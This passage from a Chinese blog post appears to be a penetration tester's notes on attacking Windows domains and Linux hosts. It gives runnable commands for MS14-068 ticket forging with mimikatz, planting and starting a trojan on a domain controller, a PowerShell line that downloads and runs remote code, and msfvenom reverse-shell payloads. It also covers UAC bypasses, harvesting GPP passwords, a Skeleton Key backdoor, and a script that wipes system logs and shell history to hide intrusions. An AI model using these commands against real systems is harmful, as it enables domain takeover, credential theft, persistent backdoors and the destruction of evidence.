cmd<br></code></pre></td></tr></table></figure><h2 id="MS14-068攻击"><a href="#MS14-068攻击" class="headerlink" title="MS14-068攻击"></a><a href="https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068">MS14-068</a><strong>攻击</strong></h2><p>  MS14-068 基于漏洞，造成的危害是允许域内任何一个普通用户，将自己提升至域管权限。</p><p>  Windows 域中使用 kerberos 协议过程中，为了让服务器判断 Client 是否有权限访问服务，微软在 Windows 平台上在 Kerberos 协议中增加了 PAC（Privilege Attribute Certificate）特权属性证书，也就是这个 PAC 造成了 MS14-068 这个漏洞。</p><p>  PAC 是用来验证 Client 的访问权限的，它会被放在 TGT 里发送给 Client，然后由 Client 发送给 TGS。</p><p>  漏洞允许经过身份验证的用户在其 Kerberos 票证（TGT）中插入任意的 PAC（表示所有用户权限的结构）。该漏洞位于 kdcsvc.dll 域控制器的密钥分发中心(KDC)中。普通用户可以通过呈现具有改变了 PAC 的 Kerberos TGT 来获得票证，进而伪造票据获得管理员权限。</p><h3 id="条件-3"><a href="#条件-3" class="headerlink" title="条件"></a><strong>条件</strong></h3><p>    1. 域内任意用户 SID</p><pre><code class="hljs">      2. 域内任意用户密码</code></pre><h3 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a><strong>攻击流程</strong></h3><p>    1. 获得一个域用户 douser 的 SID</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">whoami</span> /all<br></code></pre></td></tr></table></figure><p>    2. 上传工具 ms14-068.exe，并执行命令生成 TGT 票据</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">ms14-<span class="hljs-number">068</span><span class="hljs-selector-class">.exe</span> -u 域成员名@域名 -s 域成员sid -d 域控制器ip地址 -<span class="hljs-selector-tag">p</span> 域成员密码<br></code></pre></td></tr></table></figure><p>    3. 上传 mimikatz，利用 mimikatz 将票据注入到当前内存中伪造凭证</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs 1c">mimikatz <span class="hljs-meta"># kerberos::purge          <span class="hljs-comment">//清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造</span></span><br>mimikatz <span class="hljs-meta"># kerberos::list           <span class="hljs-comment">//查看当前机器凭证</span></span><br>mimikatz <span class="hljs-meta"># kerberos::ptc 票据文件   <span class="hljs-comment">//将票据注入到内存中</span></span><br></code></pre></td></tr></table></figure><p>    4. 使用 net use 进行登录或者使用 psexec，wmi 等方法进行远程执行命令</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span> \\<span class="hljs-keyword">WIN</span>-ENS2VR5TR3N           <span class="hljs-comment">//登录域控</span><br></code></pre></td></tr></table></figure><p>    5. 上传一个正向的 msf 马，并将该木马 copy 到域控上去执行</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">copy</span> c:\windows\system32\<span class="hljs-keyword">shell</span>.exe \\<span class="hljs-keyword">WIN</span>-ENS2VR5TR3N\c$<br></code></pre></td></tr></table></figure><p>    6. 通过 sc 远程对域控创建服务来启动木马</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">sc </span>\\WIN-ENS2VR5TR3N create <span class="hljs-keyword">bindshell </span><span class="hljs-keyword">binpath= </span><span class="hljs-string">&quot;c:\shell.exe&quot;</span><br><span class="hljs-keyword">sc </span>\\WIN-ENS2VR5TR3N start <span class="hljs-keyword">bindshell</span><br></code></pre></td></tr></table></figure><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="PsExec"><a href="#PsExec" class="headerlink" title="PsExec"></a>PsExec</h3><p>起初用于运维，基本原理是通过管道在远程目标机器上创建一个 psexec 服务，并在本地磁盘中生成一个名为“PSEXESVC”的进制文件，通过 psexec 服务运行命令，运行结束后删除（大量日志）</p><h4 id="Pth-winexe"><a href="#Pth-winexe" class="headerlink" title="Pth-winexe"></a>Pth-winexe</h4><h4 id="smbexec"><a href="#smbexec" class="headerlink" title="smbexec"></a>smbexec</h4><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><p><a href="https://gtfobins.github.io/">GTFOBins</a></p><h3 id="uid-提权"><a href="#uid-提权" class="headerlink" title="uid 提权"></a>uid 提权</h3><p> (find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null)</p><p>1.常规</p><ul><li>Nmap</li><li>Vim</li><li>find</li><li>Bash</li><li>More</li><li>Less</li><li>Nano</li><li>cp</li></ul><p>2.strings&#x2F;strace 追踪调用函数配合共享库注入&#x2F;修改 path 劫持</p><p>bash&lt;4.2 路径组合自定义函数</p><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/JBFlbtySzoDfSdxTvXrchtPLnFf.png" alt="截图"></p><p>bash&lt;4.4 环境变量劫持</p><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/AfB0b898oovlYXxpkAwcPMCTnye.png" alt="截图"></p><h3 id="sudo-提权"><a href="#sudo-提权" class="headerlink" title="sudo 提权"></a>sudo 提权</h3><p>git help config （!&#x2F;bin&#x2F;bash 或者 ！’sh’）完成提权</p><p>编写如下一个c文件</p><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/LWSIbTRrJovgeQxvbY7cIY8Jnqb.png" alt="截图"></p><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Uljwba9S8oB3aOxR3CvcpQGnnNc.png" alt="截图"></p><h3 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h3><h3 id="自动任务提权"><a href="#自动任务提权" class="headerlink" title="自动任务提权"></a>自动任务提权</h3><p>常规修改 sh 文件，相对路径劫持，配合 sh 文件内的命令</p><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20240912111725061.png" alt="image-20240912111725061"></p><p>例如会自动执行&#x2F;usr&#x2F;loca&#x2F;bin&#x2F;aaa.sh</p><p>但是可以创建一个&#x2F;home&#x2F;user&#x2F;aaa.sh劫持</p><h3 id="docker-提权"><a href="#docker-提权" class="headerlink" title="docker 提权"></a>docker 提权</h3><h3 id="Passwd-shadow-提权"><a href="#Passwd-shadow-提权" class="headerlink" title="Passwd&#x2F;shadow 提权"></a>Passwd&#x2F;shadow 提权</h3><p>shadow 解密或者手动生成 passwd&#x2F;shadow 密文</p><h3 id="NFS-提权"><a href="#NFS-提权" class="headerlink" title="NFS 提权"></a>NFS 提权</h3><h2 id="windows-1"><a href="#windows-1" class="headerlink" title="windows"></a><strong>windows</strong></h2><h3 id="POTATO"><a href="#POTATO" class="headerlink" title="POTATO"></a>POTATO</h3><p>核心是利用COM类，捕获并修改NTLM认证数据包</p><p>需求</p><ol><li>获取到高权限的 token</li><li>当前账户拥有 SeImpersonatePrivilege 或 SeAssignPrimaryTokenPrivilege 权限</li></ol><p>一般是给到本地管理员和本地服务账户，两个权限的本意是让高权限服务模拟低权限客户端来操作</p><h4 id="Origin"><a href="#Origin" class="headerlink" title="Origin"></a>Origin</h4><p>LLMNR&#x2F;NBNS投毒</p><h4 id="Rotten-Juicy"><a href="#Rotten-Juicy" class="headerlink" title="Rotten &amp; Juicy"></a>Rotten &amp; Juicy</h4><p>通过DCOM call让服务向攻击者监听端口发放NTLM认证，拿到NTLM后启动新进程</p><h4 id="PrintSpoofer"><a href="#PrintSpoofer" class="headerlink" title="PrintSpoofer"></a>PrintSpoofer</h4><p>利用了spoolsv.exe服务的RPC服务中传递\\127.0.0.1&#x2F;pipe&#x2F;foo会解析为主机名后链接</p><h4 id="RoguePotato"><a href="#RoguePotato" class="headerlink" title="RoguePotato"></a>RoguePotato</h4><h4 id="SweetPotato"><a href="#SweetPotato" class="headerlink" title="SweetPotato"></a>SweetPotato</h4><h3 id="系统漏洞提权"><a href="#系统漏洞提权" class="headerlink" title="系统漏洞提权"></a>系统漏洞提权</h3><p>通过 Webshell 命令行执行 systeminfo 命令查看系统是否打了提权补丁，可使用 exp 进行提权<br>通过 Webshell 找网站读写执行目录，把 cs 马或提权 exp 上传到对方服务器（如果 cmd 无法执行命令可单独上传 cmd.exe 到对方服务器，菜刀终端设置为 setpc:\XXX\cmd.exe）</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment">#手工查找补丁情况</span><br>systeminfo<br>Wmic qfe get Caption,Description,HotFixID,InstalledOn<br><br><span class="hljs-comment">#MSF后渗透扫描</span><br>post<span class="hljs-regexp">/windows/g</span>ather/enum_patches<br>post<span class="hljs-regexp">/multi/</span>recon/local_exploit_suggester<br><br><span class="hljs-comment">#windows exploit suggester</span><br>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/AonCyberLabs/</span>Windows-Exploit-Suggester<br><br><span class="hljs-comment">#powershell中的sherlock脚本</span><br>Import-Module C:\Sherlock.ps1 <span class="hljs-comment">#下载ps1脚本，导入模块</span><br>Find-AllVulns<br><br><span class="hljs-comment">#Empire内置模块 Empire框架也提供了关于内核溢出漏洞提权的漏洞利用方法</span><br>usemodule privesc<span class="hljs-regexp">/powerup/</span>allchecks<br>execute<br><br>其他工具<br>WES-NG<br>Sherlock<br></code></pre></td></tr></table></figure><p>exp 在线查询</p><blockquote><p><a href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a><br><a href="https://bugs.hacking8.com/tiquan/">https://bugs.hacking8.com/tiquan/</a><br><a href="https://github.com/Heptagrams/Heptagram/tree/master/Windows/Elevation">https://github.com/Heptagrams/Heptagram/tree/master/Windows/Elevation</a><br><a href="https://www.exploit-db.com/">https://www.exploit-db.com/</a><br><a href="https://i.hacking8.com/tiquan/">https://i.hacking8.com/tiquan/</a></p></blockquote><h3 id="组策略首选项"><a href="#组策略首选项" class="headerlink" title="组策略首选项"></a>组策略首选项</h3><blockquote><p>SYSVOL 是 AD(活动目录)里面一个存储域公共文件<a href="https://cloud.tencent.com/act/pro/promotion-cvm?from_column=20065&from=20065">服务器</a>副本的共享文件夹，所有的认证用户都可以读取。SYSVOL 包括登录脚本，组策略数据，以及其他域控所需要的域数据，这是因为 SYSVOL 能在所有域控里进行自动同步和共享。</p></blockquote><p>路径为：\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\</p><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20240912110205311.png" alt="image-20240912110205311"></p><p>然后用kali#gpp-decrypt破解</p><p><strong>组策略偏好 GPP</strong></p><blockquote><p>win2008 发布了 GPP(Group Policy Preferences)，其中 GPP 最有用的特性，是在某些场景存储和使用凭据，其中包括：映射驱动（Drives.xml）创建本地用户数据源（DataSources.xml）打印机配置（Printers.xml）创建&#x2F;更新服务（Services.xml）计划任务（ScheduledTasks.xml）更改本地 Administrator 密码<br>为方便对所有机器进行操作，网络管理员会使用域策略进行统一的配置和管理，那么所有机器的本地管理员密码就是一样的，造成了即使不知道密码的情况下也能修改组策略首选项的密码，也可以通过脚本破解组策略首选项文件中密码的漏洞。</p></blockquote><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment">#Powershell获取cpassword</span><br>Get-GPPPassword.ps1<br><br><span class="hljs-comment">#PowerSploit 的 Get-GPPPassword模块 检索通过组策略首选项推送的帐户的明文密码和其他信息。</span><br>powershell <span class="hljs-string">&quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1&#x27;);Get-GPPPassword&quot;</span>Import-Module .\Get-GPPPassword.ps1;Get-GPPPassword<br>kali gpp-decrypt命令破解密码<br><br><span class="hljs-comment">#Msf</span><br>run post<span class="hljs-regexp">/windows/g</span>ather<span class="hljs-regexp">/credentials/g</span>pp<br><br><span class="hljs-comment">#Empire</span><br>usemodule privesc/gpp<br></code></pre></td></tr></table></figure><h3 id="Bypass-UAC"><a href="#Bypass-UAC" class="headerlink" title="Bypass UAC"></a>Bypass UAC</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment">#Msf</span><br>exploit<span class="hljs-regexp">/windows/</span>local/ask       <span class="hljs-comment">#弹出UAC确认窗口，点击后获得system权限</span><br><br>exploit<span class="hljs-regexp">/windows/</span>local/bypassuac  <span class="hljs-comment">#此模块将通过进程注入使用可信任发布者证书绕过Windows UAC，它将生成关闭UAC标志的第二个shell。</span><br><br>exploit<span class="hljs-regexp">/windows/</span>local/bypassuac_injection <span class="hljs-comment">#此模块将通过进程注入使用可信任的发布者证书绕过Windows UAC。它将生成关闭UAC标志的第二个shell。在普通技术中，该模块使用反射式DLL注入技术并只除去了DLL payload 二进制文件，而不是三个单独的二进制文件。但是，它需要选择正确的体系架构（对于SYSWOW64系统也使用x64）。如果指定exe::custom，应在单独的进程中启动 payload 后调用ExitProcess（）</span><br><br><br>exploit<span class="hljs-regexp">/windows/</span>local/bypassuac_fodhelper<span class="hljs-comment">#此模块将通过在当前用户配置单元下劫持注册表中的特殊键并插入将在启动Windows fodhelper.exe应用程序时调用的自定义命令来绕过Windows 10 UAC。它将生成关闭UAC标志的第二个shell。此模块修改注册表项，但在调用payload后将清除该项。该模块不需要payload的体系架构和操作系统匹配。如果指定exe:custom，则应在单独的进程中启动payload后调用ExitProcess（）。</span><br><br>exploit<span class="hljs-regexp">/windows/</span>local/bypassuac_eventvwr<span class="hljs-comment">#此模块将通过在当前用户配置单元下劫持注册表中的特殊键并插入将在启动Windows事件查看器时调用的自定义命令来绕过Windows UAC。它将生成关闭UAC标志的第二个shell。此模块修改注册表项，但在调用payload后将清除该项。该模块不需要payload的体系架构和操作系统匹配。如果指定EXE ::Custom，则应在单独的进程中启动payload后调用ExitProcess（）</span><br><br>exploit<span class="hljs-regexp">/windows/</span>local/bypassuac_comhijack<span class="hljs-comment">#此模块将通过在hkcu配置单元中创建COM处理程序注册表项来绕过Windows UAC。当加载某些较高完整性级别进程时，会引用这些注册表项，从而导致进程加载用户控制的DLL,这些DLL包含导致会话权限提升的payload。此模块修改注册表项，但在调用payload后将清除该项,这个模块需要payload的体系架构和操作系统匹配，但是当前的低权限meterpreter会话体系架构中可能不同。如果指定exe:：custom，则应在单独的进程中启动payloa后调用ExitProcess（）。此模块通过目标上的cmd.exe调用目标二进制文件,因此，如果cmd.exe访问受到限制，此模块将无法正常运行。</span><br><br><span class="hljs-comment">#Powershell</span><br>Invoke-PsUACme<br><br><span class="hljs-comment">#Empire</span><br>usemodule privesc/bypassuac<br>usemodule privesc/bypassuac_wscript<br><br><span class="hljs-comment">#cs</span><br>uac-dll<br>uac-token-duplication<br></code></pre></td></tr></table></figure><h3 id="操作系统配置错误"><a href="#操作系统配置错误" class="headerlink" title="操作系统配置错误"></a>操作系统配置错误</h3><blockquote><p>管理员凭证配置错误<br>服务配置错误<br>故意削弱的安全措施<br>用户权限过高</p><p>不带引号的服务路径</p></blockquote><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nsis"><span class="hljs-comment"># 存储Windows服务有关的信息 </span><br><span class="hljs-params">HKEY_LOCAL_MACHINE</span>\<span class="hljs-params">SYSTEM</span>\CurrentControlSet\Services <br><span class="hljs-comment"># 服务对应的程序路径存储 </span><br><span class="hljs-params">HKEY_LOCAL_MACHINE</span>\<span class="hljs-params">SYSTEM</span>\ControlSet001\Services\Vulnerable Service\服务名\ImagePath <br><span class="hljs-comment"># AlwaysInstallElevated  允许低权限用户以最高权限安装MSI文件</span><br></code></pre></td></tr></table></figure><h3 id="其他-1"><a href="#其他-1" class="headerlink" title="其他"></a>其他</h3><ul><li>sc 命令提权（administrator–&gt;system）</li></ul><p>​例如：<code>sc Create syscmd binPath= “cmd /K start” type= own type=interactsc start systcmd</code> 就得到了一个 system 权限的 cmd 环境</p><ul><li><p>不带引号的服务路径</p><p>当服务路径带空格的时候，路径空格目录前面一断就会当作文件执行，如 <code>C:\ProgramFiles\MSBuild</code> 这个目录，攻击者只要在 c </p><p>创建名为 <code>Program.exe</code> 的木马，最后只要系统重启就会执行 <code>C:\Program.exe</code> 文件。</p></li><li><p>不安全的服务权限提升</p><p>由于管理配置错误，用户可能对服务拥有过多的权限，例如用木马替换服务调用的默认文件。</p></li><li><p>数据库提权</p></li><li><p>访问令牌提权</p></li></ul><h1 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h1><h2 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h2><blockquote><p>预加载型动态链接库后门<br>strace 后门<br>SSH 后门<br>SUID 后门<br>inetd 服务后门<br>协议后门<br>vim 后门<br>PAM 后门<br>进程注入<br>Rootkit<br>端口复用</p></blockquote><h2 id="windows-2"><a href="#windows-2" class="headerlink" title="windows"></a>windows</h2><blockquote><p>替换系统文件类(shift 后门,放大镜后门)<br>修改注册表类<br>自启动项、屏幕保护程序注册表、用户登陆初始化、登录脚本、映像劫持、影子账户、AppCertDlls 注册表项、AppInit_DLLs 注册表项、文件关联、用户登陆初始化、xx.Netsh Helper DLL<br>文件类<br>自启动文件夹、office Word StartUp 劫持<br>计划任务<br>schtasks 、WMI、bitsadmin</p></blockquote><h2 id="域后门"><a href="#域后门" class="headerlink" title="域后门"></a>域后门</h2><p><a href="https://www.freebuf.com/articles/network/359329.html">常见域后门技术总结与分析利用 - FreeBuf网络安全行业门户</a></p><h3 id="Skeleton-key"><a href="#Skeleton-key" class="headerlink" title="Skeleton key"></a>Skeleton key</h3><p>注入lsass.exe进程实现‘万能密码’，重启后失效</p><p>mimikatz.exe “privilege::debug” “misc::skeleton” exit # 密码为 mimikatz</p><h3 id="DSRM"><a href="#DSRM" class="headerlink" title="DSRM"></a>DSRM</h3><p>在域控上，DSRM 账户实际上就是本地管理员账户（Administrator），并且该账户的密码在创建后几乎很少使用。通过在域控上运行 NTDSUtil，可以为 DSRM 账户修改密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs Bash">ntdsutil <span class="hljs-comment"># 进入 ntdsutil</span><br><span class="hljs-built_in">set</span> dsrm password <span class="hljs-comment"># 进入设置 DSRM 账户密码设置模式</span><br>reset password on server null <span class="hljs-comment"># 在当前域控上恢复 DSRM 密码</span><br>&lt;password&gt;  <span class="hljs-comment"># 输入新密码 123456Lhz！</span><br>&lt;password&gt;  <span class="hljs-comment"># 再次输入新密码</span><br>q <span class="hljs-comment"># 退出 DSRM 密码设置模式</span><br>q <span class="hljs-comment"># 退出 ntdsutil</span><br></code></pre></td></tr></table></figure><p>#痕迹清理</p><h2 id="windows-3"><a href="#windows-3" class="headerlink" title="windows"></a>windows</h2><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20240819105232499.png" alt="image-20240819105232499"></p><p>1.查看事件日志 run event_manager -i</p><p>2.删除事件日志 run event_manager -c</p><p>3.clearv 命令清除目标系统的事件日志。</p><p>清除命令历史记录</p><p>histroy -r          #删除当前会话历史记录</p><p>history -c          #删除内存中的所有命令历史</p><p>rm .bash_history   #删除历史文件中的内容</p><p>HISTZISE&#x3D;0          #通过设置历史命令条数来清除所有历史记录</p><p>在隐蔽的位置执行命令</p><p>使用 vim 打开文件执行命令</p><p>:set history&#x3D;0</p><p>:!command</p><h2 id="linux-1"><a href="#linux-1" class="headerlink" title="linux"></a>linux</h2><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20240819105158564.png" alt="image-20240819105158564"></p><p>&#x2F;var&#x2F;run&#x2F;utmp 记录现在登入的用户</p><p>&#x2F;var&#x2F;log&#x2F;wtmp 记录用户所有的登入和登出</p><p>&#x2F;var&#x2F;log&#x2F;lastlog 记录每一个用户最后登入时间</p><p>&#x2F;var&#x2F;log&#x2F;btmp 记录错误的登入尝试</p><p>&#x2F;var&#x2F;log&#x2F;auth.log 需要身份确认的操作</p><p>&#x2F;var&#x2F;log&#x2F;secure 记录安全相关的日志信息</p><p>&#x2F;var&#x2F;log&#x2F;maillog 记录邮件相关的日志信息</p><p>&#x2F;var&#x2F;log&#x2F;message 记录系统启动后的信息和错误日志</p><p>&#x2F;var&#x2F;log&#x2F;cron 记录定时任务相关的日志信息</p><p>&#x2F;var&#x2F;log&#x2F;spooler 记录 UUCP 和 news 设备相关的日志信息</p><p>&#x2F;var&#x2F;log&#x2F;boot.log 记录守护进程启动和停止相关的日志消息</p><p>完全删除日志文件：</p><p>cat &#x2F;dev&#x2F;null &gt; filename</p><p>: &gt; filename</p><p>filename</p><p>echo “” &gt; filename</p><p>echo &gt; filename</p><p>针对性删除日志文件：</p><p>删除当天日志</p><p>sed  -i ‘&#x2F;当天日期&#x2F;‘d  filename</p><p>一键清除脚本：</p><p>!&#x2F;usr&#x2F;bin&#x2F;bash</p><p>echo &gt; &#x2F;var&#x2F;log&#x2F;syslog</p><p>echo &gt; &#x2F;var&#x2F;log&#x2F;messages</p><p>echo &gt; &#x2F;var&#x2F;log&#x2F;httpd&#x2F;access_log</p><p>echo &gt; &#x2F;var&#x2F;log&#x2F;httpd&#x2F;error_log</p><p>echo &gt; &#x2F;var&#x2F;log&#x2F;xferlog</p><p>echo &gt; &#x2F;var&#x2F;log&#x2F;secure</p><p>echo &gt; &#x2F;var&#x2F;log&#x2F;auth.log</p><p>echo &gt; &#x2F;var&#x2F;log&#x2F;user.log</p><p>echo &gt; &#x2F;var&#x2F;log&#x2F;wtmp</p><p>echo &gt; &#x2F;var&#x2F;log&#x2F;lastlog</p><p>echo &gt; &#x2F;var&#x2F;log&#x2F;btmp</p><p>echo &gt; &#x2F;var&#x2F;run&#x2F;utmp</p><p>rm ~&#x2F;.&#x2F;bash_history</p><p>history -c</p><p>Linux</p><p>Windows</p><h1 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h1><h2 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h2><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20240917230028258.png" alt="image-20240917230028258"></p><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20240917230052008.png" alt="image-20240917230052008"></p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs diff">常用参数<br><br><span class="hljs-deletion">-u -l指定url和url文件</span><br><br><span class="hljs-deletion">-e -X 包含和排除后缀 -f在字典后面增加后缀</span><br><br><span class="hljs-deletion">-w 指定字典</span><br><br><span class="hljs-deletion">-i -x 指定保留和排除的响应状态码</span><br><br>dirsearch.py -u url -e php -i 200<br></code></pre></td></tr></table></figure><h2 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h2><blockquote><p><a href="https://blog.csdn.net/weixin_45588247/article/details/119614618">https://blog.csdn.net/weixin_45588247&#x2F;article&#x2F;details&#x2F;119614618</a><br><a href="https://www.anquanke.com/post/id/164525">https://www.anquanke.com/post/id/164525</a></p></blockquote><h3 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h3><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/QqhVb8pD4oClfixKgowcNisJnqd.png" alt="截图"></p><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/VpEBbVXlVoCXg4xyKjqclkTynhe.png" alt="截图"></p><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/VRxLbPbLboDpcKxJHhsc1fvInzh.png" alt="截图"></p><p>其中：meterpreter 组件（stage）是一种基于内存 DDL 注入的后渗透工具</p><h3 id="模块分类"><a href="#模块分类" class="headerlink" title="模块分类"></a>模块分类</h3><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/EhyrbLCxVo3pzpxRZ76cK92yn8e.png" alt="截图"></p><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/WFZ3bTsvBoBdzJxD1ZlcmCL2nhc.png" alt="截图"></p><h4 id="Auxiliary-扫描器"><a href="#Auxiliary-扫描器" class="headerlink" title="Auxiliary 扫描器"></a>Auxiliary 扫描器</h4><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/SLR6bjrYhoDHAHxgiZocgSCpn5g.png" alt="截图"></p><h4 id="攻击载荷和编码"><a href="#攻击载荷和编码" class="headerlink" title="攻击载荷和编码"></a>攻击载荷和编码</h4><p>这里利用 msfvemon 来替代</p><blockquote><p>msfvenom -p linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;<Your IP Address> LPORT&#x3D;<Your Port to Connect On> -f elf &gt; shell.elf<br>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;<Your IP Address> LPORT&#x3D;<Your Port to Connect On> -f exe &gt; shell.exe<br>-p 指定 payload<br>-e 编码器<br>-i 迭代器<br>-f 输出格式</p></blockquote><h4 id="POST-后渗透"><a href="#POST-后渗透" class="headerlink" title="POST 后渗透"></a>POST 后渗透</h4><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/IX6Ubug2FohidmxFGMqc3WY6nuf.png" alt="截图"></p><h3 id="使用流程"><a href="#使用流程" class="headerlink" title="使用流程"></a>使用流程</h3><h4 id="基础使用"><a href="#基础使用" class="headerlink" title="基础使用"></a>基础使用</h4><p>这个就不多写了</p><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/E7orbUVrtoPXw5xMZThcwo2YnNg.png" alt="截图"></p><h4 id="后渗透-windows"><a href="#后渗透-windows" class="headerlink" title="后渗透(windows)"></a>后渗透(windows)</h4><blockquote><p><a href="https://cloud.tencent.com/developer/article/1180234">https://cloud.tencent.com/developer/article/1180234</a></p></blockquote><h5 id="一-创建会话"><a href="#一-创建会话" class="headerlink" title="一.创建会话"></a>一.创建会话</h5><p><a href="https://blog.csdn.net/weixin_44823747/article/details/110056175">https://blog.csdn.net/weixin_44823747&#x2F;article&#x2F;details&#x2F;110056175</a></p><p>1.通过-l 参数来查看可以生成的 payload</p><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/SlULb9DgDoMK6WxHkwzcWP9onMf.png" alt="截图"></p><p>其中可以分为三类，二进制文件，webshell 和脚本 shell</p><p>2.反弹 shell 建立如下</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p linux/x86/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"> Port </span><span class="hljs-keyword">to</span> Connect On&gt; -f elf &gt; shell.elf<br>msfvenom -p windows/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span 